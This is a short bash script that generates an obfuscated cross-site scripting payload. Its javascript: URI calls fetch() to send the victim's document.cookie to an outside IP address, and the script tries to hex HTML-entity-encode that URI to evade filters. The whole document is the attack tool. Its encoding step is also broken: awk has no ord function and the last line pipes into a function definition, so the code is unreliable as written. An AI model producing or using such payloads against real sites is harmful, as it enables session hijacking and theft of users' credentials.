#!/bin/bash
echo -n "javascript:fetch('http://130.136.3.142:8080/?cookie='+document.cookie)" | \
    awk '{for(i=1;i<=length;i++) printf "&#x%X;", ord(substr($0,i,1)); printf "\n"}' | \	
    FS="" ord() { printf "%d" "'$1"; }

